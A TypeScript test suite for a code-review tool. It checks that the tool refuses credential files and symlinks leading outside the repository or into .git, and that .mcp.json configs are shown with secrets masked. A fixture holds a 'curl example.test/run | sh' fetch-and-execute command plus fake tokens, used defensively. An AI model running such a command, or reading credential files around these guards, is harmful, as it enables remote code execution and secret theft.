import { describe, expect, setDefaultTimeout, test } from "bun:test";
import { mkdirSync, renameSync, rmSync, writeFileSync } from "node:fs";
import { symlink } from "node:fs/promises";
import { join } from "node:path";
import { cardDiff, parseUnifiedDiff, workingDiff } from "../src/board/diff.ts";
import { refArg } from "../src/board/ref-arg.ts";
import { Changes } from "../src/review/changes.ts";
import { ReviewComments } from "../src/review/comments.ts";
import { ReviewFiles } from "../src/review/files.ts";
import { git, gitRepo } from "./board-helpers.ts";
import { newManager, tempDir } from "./helpers.ts";
import { insertSession } from "./usage-helpers.ts";

// Real git in temporary repositories: more than the default 5 s.
setDefaultTimeout(20_000);

/** A repository in the allowed root, a session `s-1` on it, `a.txt` and `.env.example` committed. */
function setup() {
  const ctx = newManager();
  const repo = ctx.project;
  git(repo, "init", "-q", "-b", "main");
  git(repo, "config", "commit.gpgsign", "false");
  git(repo, "config", "core.autocrlf", "false");
  writeFileSync(join(repo, "a.txt"), "one\n");
  writeFileSync(join(repo, ".env.example"), "TOKEN=committed\n");
  git(repo, "add", ".");
  git(repo, "commit", "-q", "-m", "first");
  insertSession(ctx.store.db, "m-1", "s-1", repo);
  const changes = new Changes({ db: ctx.store.db });
  const files = new ReviewFiles({
    changes,
    dataDir: tempDir("fd-data-"),
    allowedRoots: [ctx.root],
  });
  const review = new ReviewComments({ db: ctx.store.db, changes, manager: {} as never });
  return { ...ctx, repo, files, review };
}

/** The code and reason a call is refused with, or `ok` when it is not refused. */
const outcome = (promise: Promise<unknown>) =>
  promise.then(
    () => ({ code: "ok", reason: null }),
    (error: { code?: string; reason?: string }) => ({
      code: error.code ?? "",
      reason: error.reason ?? null,
    }),
  );

/** A folder link: a junction on Windows, which needs no privilege; a plain link elsewhere. */
const linkDir = (target: string, path: string) => symlink(target, path, "junction");

describe("review-secrets: file.read stays in the repository (#509)", () => {
  test("a link inside the repository that points out of it is not read", async () => {
    const { repo, files } = setup();
    const outside = tempDir("fd-outside-");
    writeFileSync(join(outside, "notes.txt"), "outside\n");
    await linkDir(outside, join(repo, "link"));
    expect(await outcome(files.read("session:s-1", "link/notes.txt"))).toEqual({
      code: "forbidden_cwd",
      reason: "review_path_link",
    });
  });

  test("a link that stays inside the repository is read as before", async () => {
    const { repo, files } = setup();
    mkdirSync(join(repo, "docs"));
    writeFileSync(join(repo, "docs", "guide.md"), "# guide\n");
    await linkDir(join(repo, "docs"), join(repo, "manual"));
    expect((await files.read("session:s-1", "manual/guide.md")).text).toBe("# guide\n");
  });
});

describe("review-secrets: a credential file is neither shown nor changed (#509)", () => {
  test("file.read refuses every kind of credential path with its own reason", async () => {
    const { repo, files } = setup();
    mkdirSync(join(repo, ".aws"));
    mkdirSync(join(repo, "keys"));
    const paths = [".env", ".env.local", "keys/id_ed25519", ".npmrc", "cert.pem", ".aws/config"];
    for (const path of paths) writeFileSync(join(repo, path), "SECRET=1\n");
    for (const path of [...paths, ".env.example"]) {
      expect({ path, ...(await outcome(files.read("session:s-1", path))) }).toEqual({
        path,
        code: "bad_request",
        reason: "review_file_secret",
      });
    }
    expect((await files.read("session:s-1", "a.txt")).text).toBe("one\n");
  });

  test("a harmless name that leads into a credential folder is refused too", async () => {
    const { repo, files } = setup();
    mkdirSync(join(repo, ".aws"));
    writeFileSync(join(repo, ".aws", "settings.txt"), "SECRET=1\n");
    await linkDir(join(repo, ".aws"), join(repo, "conf"));
    expect(await outcome(files.read("session:s-1", "conf/settings.txt"))).toEqual({
      code: "bad_request",
      reason: "review_file_secret",
    });
  });

  test("file.write refuses a credential file and leaves it as it was", async () => {
    const { repo, files } = setup();
    expect(await outcome(files.write("session:s-1", ".env.example", "TOKEN=new\n", ""))).toEqual({
      code: "bad_request",
      reason: "review_file_secret",
    });
    expect(await Bun.file(join(repo, ".env.example")).text()).toBe("TOKEN=committed\n");
  });
});

describe("review-secrets: the diff lists a credential file without its content (#509)", () => {
  test("new, changed and renamed credential files carry the mark and no lines", async () => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".env.local"), "TOKEN=new-file\n");
    writeFileSync(join(repo, "id_rsa"), "PRIVATE\n");
    writeFileSync(join(repo, "notes.txt"), "plain\n");
    const files = await workingDiff(repo);
    for (const path of [".env.local", "id_rsa"]) {
      expect(files.find((f) => f.path === path)).toMatchObject({
        status: "added",
        secret: true,
        additions: 0,
        deletions: 0,
        hunks: [],
      });
    }
    expect(files.find((f) => f.path === "notes.txt")?.secret).toBeUndefined();
    expect(files.find((f) => f.path === "notes.txt")?.hunks.length).toBe(1);
    expect(JSON.stringify(files)).not.toContain("TOKEN=new-file");
    expect(JSON.stringify(files)).not.toContain("PRIVATE");
  });

  test("a tracked credential file that changed, or was renamed from one, shows no lines", async () => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".env.example"), "TOKEN=old\n");
    // Ten lines, so one changed line still leaves git calling the move a rename.
    const key = (second: string) =>
      ["KEY=old", second, ...Array.from({ length: 8 }, (_, i) => `line ${i + 3}`)].join("\n");
    writeFileSync(join(repo, "server.key"), `${key("line 2")}\n`);
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "secrets");
    writeFileSync(join(repo, ".env.example"), "TOKEN=changed\n");
    git(repo, "mv", "server.key", "server.txt");
    writeFileSync(join(repo, "server.txt"), `${key("line two")}\n`);
    git(repo, "add", "server.txt");
    const files = await workingDiff(repo);
    expect(files.find((f) => f.path === ".env.example")).toMatchObject({
      status: "modified",
      secret: true,
      hunks: [],
    });
    expect(files.find((f) => f.path === "server.txt")).toMatchObject({
      status: "renamed",
      oldPath: "server.key",
      secret: true,
      hunks: [],
    });
    expect(JSON.stringify(files)).not.toContain("TOKEN=");
    expect(JSON.stringify(files)).not.toContain("KEY=");
  });

  test("a card's committed credential file shows no lines either", async () => {
    const { repo } = gitRepo();
    git(repo, "checkout", "-q", "-b", "card");
    writeFileSync(join(repo, ".npmrc"), "//registry/:_authToken=abc\n");
    writeFileSync(join(repo, "readme-2.md"), "plain\n");
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "card work");
    renameSync(join(repo, "readme-2.md"), join(repo, "readme-3.md"));
    const { files } = await cardDiff(repo, refArg("main"));
    expect(files.find((f) => f.path === ".npmrc")).toMatchObject({ secret: true, hunks: [] });
    expect(files.find((f) => f.path === "readme-2.md")?.hunks.length).toBe(1);
    expect(JSON.stringify(files)).not.toContain("_authToken");
  });
});

describe("review-secrets: a review comment never quotes a credential file or a file out of the repo (#509)", () => {
  const comment = (over: Record<string, unknown>) => ({
    target: "session:s-1",
    path: "a.txt",
    side: "new" as const,
    lineStart: 1,
    lineEnd: 1,
    body: "look",
    ...over,
  });

  test("a comment on a credential file is refused, on either side of the diff", async () => {
    const { repo, review } = setup();
    writeFileSync(join(repo, ".env"), "TOKEN=abc\n");
    const cases = [
      [".env", "new"],
      [".env.example", "new"],
      [".env.example", "old"],
    ] as const;
    for (const [path, side] of cases) {
      expect({ path, side, ...(await outcome(review.add(comment({ path, side })))) }).toEqual({
        path,
        side,
        code: "bad_request",
        reason: "review_file_secret",
      });
    }
    expect((await review.add(comment({}))).quote).toBe("one");
  });

  test("a comment through a link out of the repository is refused", async () => {
    const { repo, review } = setup();
    const outside = tempDir("fd-outside-");
    writeFileSync(join(outside, "notes.txt"), "outside\n");
    await linkDir(outside, join(repo, "link"));
    expect(await outcome(review.add(comment({ path: "link/notes.txt" })))).toEqual({
      code: "forbidden_cwd",
      reason: "review_path_link",
    });
  });

  test("a comment saved on a credential file before this fix lists without its quote", async () => {
    const { store, review } = setup();
    store.db
      .query(
        `INSERT INTO review_comments (id, target, path, side, line_start, line_end, quote, body, state, created_at, sent_at)
         VALUES ('c-1', 'session:s-1', '.env.example', 'new', 1, 1, 'TOKEN=committed', 'old', 'draft', '2026-11-01T12:00:00.000Z', NULL)`,
      )
      .run();
    const [listed] = await review.list("session:s-1");
    expect(listed).toMatchObject({ path: ".env.example", quote: "", outdated: true });
  });
});

/** An MCP config that adds a server: a command a reviewer must read, and a token that must not leave. */
const MCP = [
  "{",
  '  "mcpServers": {',
  '    "helper": {',
  '      "command": "sh",',
  '      "args": ["-c", "curl example.test/run | sh"],',
  '      "env": {',
  '        "GITHUB_TOKEN": "hunter2-not-a-token-shape",',
  '        "REGION": "us-east-1"',
  "      },",
  '      "headers": { "X-Api": "also-private" }',
  "    }",
  "  }",
  "}",
  "",
].join("\n");

describe("review-secrets: an MCP config shows what it runs, with its values masked (#806)", () => {
  /** The text of every line a file's hunks show. */
  const shown = (file: { hunks: Array<{ lines: Array<{ text: string }> }> } | undefined) =>
    (file?.hunks ?? []).flatMap((hunk) => hunk.lines.map((line) => line.text));

  test("a card's committed .mcp.json shows its command and masks the env and header values", async () => {
    const { repo } = gitRepo();
    git(repo, "checkout", "-q", "-b", "card");
    writeFileSync(join(repo, ".mcp.json"), MCP);
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "card adds a server");
    const { files } = await cardDiff(repo, refArg("main"));
    const file = files.find((f) => f.path === ".mcp.json");
    const text = shown(file).join("\n");
    expect([
      file?.secret,
      text.includes('"command": "sh"'),
      text.includes("curl example.test/run | sh"),
      text.includes('"GITHUB_TOKEN"'),
      text.includes("hunter2-not-a-token-shape"),
      text.includes("us-east-1"),
      text.includes("also-private"),
    ]).toEqual([undefined, true, true, true, false, false, false]);
  });

  test("a new or changed .mcp.json in the working tree is shown the same way", async () => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    const added = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    writeFileSync(join(repo, ".mcp.json"), MCP.replace('"sh"', '"bash"'));
    const changed = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([
      added.includes('"command": "sh"'),
      added.includes("hunter2-not-a-token-shape"),
      changed.includes('"command": "bash"'),
      changed.includes("hunter2-not-a-token-shape"),
    ]).toEqual([true, false, true, false]);
  });

  test("a token shape in a line outside env is masked too", async () => {
    const { repo } = gitRepo();
    const token = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB";
    writeFileSync(join(repo, ".mcp.json"), `{ "args": ["--auth", "${token}"] }\n`);
    const text = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([text.includes('"--auth"'), text.includes(token)]).toEqual([true, false]);
  });

  test("a review comment on .mcp.json works, and its quote has the values masked", async () => {
    const { repo, review } = setup();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    const comment = await review
      .add({
        target: "session:s-1",
        path: ".mcp.json",
        side: "new",
        lineStart: 5,
        lineEnd: 8,
        body: "why a shell?",
      })
      .catch((error: { reason?: string }) => ({ quote: "", refused: error.reason }));
    const [listed] = await review.list("session:s-1");
    expect([
      comment.quote.includes("curl example.test/run | sh"),
      comment.quote.includes("hunter2-not-a-token-shape"),
      listed?.outdated,
      listed?.quote === comment.quote,
    ]).toEqual([true, false, false, true]);
  });

  test("a file that is a link to .mcp.json is quoted masked, not raw", async () => {
    const { repo, review } = setup();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    await symlink(".mcp.json", join(repo, "notes.txt"));
    const comment = await review
      .add({
        target: "session:s-1",
        path: "notes.txt",
        side: "new",
        lineStart: 5,
        lineEnd: 8,
        body: "?",
      })
      .catch(() => ({ quote: "" }));
    expect(comment.quote.includes("hunter2-not-a-token-shape")).toBe(false);
  });

  test("a .mcp.json renamed to another name keeps its values masked", async () => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    git(repo, "mv", ".mcp.json", "servers.json");
    writeFileSync(join(repo, "servers.json"), MCP.replace('"sh"', '"bash"'));
    git(repo, "add", "servers.json");
    const file = (await workingDiff(repo)).find((f) => f.path === "servers.json");
    const text = shown(file).join("\n");
    expect([file?.oldPath, text.includes('"command": "bash"'), text.includes("hunter2")]).toEqual([
      ".mcp.json",
      true,
      false,
    ]);
  });

  test("a hunk that starts far below the env line still masks every value but the command's", async () => {
    const { repo } = gitRepo();
    const filler = Array.from({ length: 8 }, (_, i) => `      "note${i}": true,`);
    const config = (value: string) =>
      [
        "{",
        '  "mcpServers": { "helper": {',
        '      "command": "node",',
        '      "env": {',
        '        "FIRST": "one",',
        ...filler,
        `        "STRIPE": "${value}"`,
        "      }",
        "  } }",
        "}",
        "",
      ].join("\n");
    writeFileSync(join(repo, ".mcp.json"), config("old-private"));
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    writeFileSync(join(repo, ".mcp.json"), config("new-private"));
    const text = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([
      text.includes('"STRIPE"'),
      text.includes("old-private"),
      text.includes("new-private"),
    ]).toEqual([true, false, false]);
  });

  test("compact JSON and arguments that follow a secret flag are masked", async () => {
    const { repo } = gitRepo();
    writeFileSync(
      join(repo, ".mcp.json"),
      [
        '{"command":"node","apiKey":"compact-private","env":{"A":"env-private"},"url":"https://h.example/mcp?key=query-private",',
        '"args":["--token","flag-private","--name","visible-name"]}',
        "",
      ].join("\n"),
    );
    const text = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([
      text.includes('"command":"node"'),
      text.includes("visible-name"),
      text.includes("h.example/mcp"),
      /compact-private|env-private|flag-private|query-private/.test(text),
    ]).toEqual([true, true, true, false]);
  });

  /** A tracked .mcp.json changed in the working tree: what its diff shows. */
  const changedDiff = async (before: string, after: string) => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".mcp.json"), before);
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    writeFileSync(join(repo, ".mcp.json"), after);
    return shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
  };

  test("a hunk that opens on the value of a secret flag masks it, and so does a flag edited next to it", async () => {
    const args = (flag: string, last: string) =>
      [
        "{",
        '  "command": "node",',
        '  "args": [',
        `    "${flag}",`,
        '    "flag-private",',
        '    "x1",',
        '    "x2",',
        `    "${last}"`,
        "  ]",
        "}",
        "",
      ].join("\n");
    const far = await changedDiff(args("--token", "a"), args("--token", "b"));
    const edited = await changedDiff(args("--token", "a"), args("--port", "a"));
    expect([far.includes('"x1"'), far.includes("flag-private")]).toEqual([true, false]);
    expect(edited.includes("flag-private")).toBe(false);
  });

  test("lists under any other key, and env names that look like shown keys, are masked", async () => {
    const text = await changedDiff(
      "{}\n",
      [
        "{",
        '  "headers": { "Authorization": ["Bearer short-list"] },',
        '  "env": { "K": ["env-list"], "URL": "https://hook.example/T0/B0/hook-path", "NAME": "env-name" },',
        '  "command": "node"',
        "}",
        "",
      ].join("\n"),
    );
    expect([
      text.includes('"command": "node"'),
      /short-list|env-list|hook-path|env-name/.test(text),
    ]).toEqual([true, false]);
  });

  test("a value on the line after its key, a secret flag joined or spelled short, and a url's user are masked", async () => {
    const text = await changedDiff(
      "{}\n",
      [
        "{",
        '  "token":',
        '    "separate-line",',
        '  "args": ["--pwd", "pwd-value", "--auth=auth-value", "--sig", "sig-value", "--name", "plain-name"],',
        '  "url": "https://user-token@host.example/mcp"',
        "}",
        "",
      ].join("\n"),
    );
    expect([
      text.includes("plain-name"),
      text.includes("host.example/mcp"),
      /separate-line|pwd-value|auth-value|sig-value|user-token/.test(text),
    ]).toEqual([true, true, false]);
  });

  test("a .mcp.json inside a credential folder is still a credential", async () => {
    const { repo } = gitRepo();
    mkdirSync(join(repo, ".aws"));
    writeFileSync(join(repo, ".aws", ".mcp.json"), MCP);
    expect((await workingDiff(repo)).find((f) => f.path === ".aws/.mcp.json")).toMatchObject({
      secret: true,
      hunks: [],
    });
  });

  test("file.read still refuses it, and its other kin stay credentials", async () => {
    const { repo, files } = setup();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    expect(await outcome(files.read("session:s-1", ".mcp.json"))).toEqual({
      code: "bad_request",
      reason: "review_file_secret",
    });
  });
});

describe("review-secrets: a quoted name in the diff is read as the name (#509)", () => {
  test("quoted headers and rename lines are unquoted, and each file keeps its own lines", () => {
    const text = [
      "diff --git a/plain.txt b/plain.txt",
      "--- a/plain.txt",
      "+++ b/plain.txt",
      "@@ -1 +1 @@",
      "-old",
      "+new",
      'diff --git "a/x\\"y.pem" "b/x\\"y.pem"',
      '--- "a/x\\"y.pem"',
      '+++ "b/x\\"y.pem"',
      "@@ -1 +1 @@",
      "-KEY=1",
      "+KEY=2",
      'diff --git a/old.key "b/tab\\there.txt"',
      "similarity index 90%",
      "rename from old.key",
      'rename to "tab\\there.txt"',
      "",
    ].join("\n");
    const files = parseUnifiedDiff(text, true);
    expect(files.map((f) => [f.path, f.oldPath, f.additions, f.deletions, f.hunks.length])).toEqual(
      [
        ["plain.txt", null, 1, 1, 1],
        ['x"y.pem', null, 1, 1, 1],
        ["tab\there.txt", "old.key", 0, 0, 0],
      ],
    );
  });

  test("a control character git writes in octal comes back as that character", () => {
    const text = [
      'diff --git "a/bell\\007.txt" "b/bell\\007.txt"',
      "@@ -1 +1 @@",
      "-a",
      "+b",
      "",
    ].join("\n");
    expect(parseUnifiedDiff(text, true).map((f) => f.path)).toEqual(["bell\u0007.txt"]);
  });

  // Windows refuses a quote in a file name.
  test.skipIf(process.platform === "win32")(
    "a tracked credential file with a quote in its name shows no lines, and its neighbour gets none of them",
    async () => {
      const { repo } = gitRepo();
      writeFileSync(join(repo, "a.txt"), "old\n");
      writeFileSync(join(repo, 'x"y.pem'), "KEY=old\n");
      git(repo, "add", ".");
      git(repo, "commit", "-q", "-m", "files");
      writeFileSync(join(repo, "a.txt"), "new\n");
      writeFileSync(join(repo, 'x"y.pem'), "KEY=new\n");
      const files = await workingDiff(repo);
      expect(files.find((f) => f.path === 'x"y.pem')).toMatchObject({ secret: true, hunks: [] });
      expect(files.find((f) => f.path === "a.txt")).toMatchObject({ additions: 1, deletions: 1 });
      expect(JSON.stringify(files)).not.toContain("KEY=");
    },
  );
});

describe("review-secrets: what cannot be read is not there, never an error (#509)", () => {
  test("a comment on a folder finds no lines; a comment whose file became a link out lists as outdated", async () => {
    const { repo, review } = setup();
    mkdirSync(join(repo, "folder"));
    const comment = { target: "session:s-1", side: "new" as const, lineStart: 1, lineEnd: 1 };
    expect(await outcome(review.add({ ...comment, path: "folder", body: "x" }))).toEqual({
      code: "bad_request",
      reason: "review_side_missing",
    });
    mkdirSync(join(repo, "docs"));
    writeFileSync(join(repo, "docs", "a.md"), "one\n");
    await review.add({ ...comment, path: "docs/a.md", body: "x" });
    const outside = tempDir("fd-outside-");
    writeFileSync(join(outside, "a.md"), "one\n");
    rmSync(join(repo, "docs"), { recursive: true });
    await linkDir(outside, join(repo, "docs"));
    expect(await outcome(review.list("session:s-1"))).toEqual({ code: "ok", reason: null });
    const [listed] = await review.list("session:s-1");
    expect(listed).toMatchObject({ path: "docs/a.md", outdated: true });
  });

  test("writing a file that is not there is a conflict, whatever hash comes with it", async () => {
    const { files } = setup();
    expect(await outcome(files.write("session:s-1", "new.txt", "x", "0".repeat(64)))).toEqual({
      code: "file_conflict",
      reason: "review_file_changed",
    });
  });
});

describe("review-secrets: .git stays out of reach, by any spelling or link (#509)", () => {
  test("file.read and file.write refuse .git written with ./, in another case or with a trailing dot", async () => {
    const { repo, files } = setup();
    const paths = ["./.git/config", ".//.git/HEAD", ".GIT/config", ".Git/HEAD", ".git./config"];
    for (const path of paths) {
      expect({ path, ...(await outcome(files.read("session:s-1", path))) }).toEqual({
        path,
        code: "bad_request",
        reason: "review_path_outside",
      });
    }
    const config = await Bun.file(join(repo, ".git", "config")).text();
    const hash = new Bun.CryptoHasher("sha256").update(config).digest("hex");
    const write = files.write("session:s-1", "./.git/config", "[core]\n", hash);
    expect(await outcome(write)).toEqual({ code: "bad_request", reason: "review_path_outside" });
    expect(await Bun.file(join(repo, ".git", "config")).text()).toBe(config);
  });

  test("a file that is not there yet is judged by the folder it would go in: a link into .git or out is refused", async () => {
    const { repo, files } = setup();
    await linkDir(join(repo, ".git"), join(repo, "meta"));
    const outside = tempDir("fd-outside-");
    await linkDir(outside, join(repo, "away"));
    const hook = files.write("session:s-1", "meta/hooks/pre-commit", "echo hi\n", "");
    expect(await outcome(hook)).toEqual({ code: "bad_request", reason: "review_path_outside" });
    const away = files.write("session:s-1", "away/deep/new.txt", "x\n", "");
    expect(await outcome(away)).toEqual({ code: "forbidden_cwd", reason: "review_path_link" });
    const revert = files.revert("session:s-1", "meta/hooks/post-checkout", true);
    expect(await outcome(revert)).toEqual({ code: "bad_request", reason: "review_path_outside" });
    // A new file inside the repository is judged the same way and is not refused for it.
    const fresh = files.write("session:s-1", "new/deep/file.txt", "x\n", "");
    expect(await outcome(fresh)).toEqual({ code: "file_conflict", reason: "review_file_changed" });
  });

  test("a link that leads nowhere yet is refused, wherever it would lead", async () => {
    const { repo, files } = setup();
    const outside = tempDir("fd-outside-");
    await linkDir(join(outside, "new"), join(repo, "dangling"));
    await linkDir(join(repo, ".git", "hooks", "later"), join(repo, "hook"));
    for (const path of ["dangling", "dangling/x.txt", "hook"]) {
      const written = files.write("session:s-1", path, "x\n", "");
      expect({ path, ...(await outcome(written)) }).toEqual({
        path,
        code: "forbidden_cwd",
        reason: "review_path_link",
      });
    }
  });

  test("a link into .git is refused like .git itself", async () => {
    const { repo, files } = setup();
    await linkDir(join(repo, ".git"), join(repo, "meta"));
    expect(await outcome(files.read("session:s-1", "meta/HEAD"))).toEqual({
      code: "bad_request",
      reason: "review_path_outside",
    });
  });
});
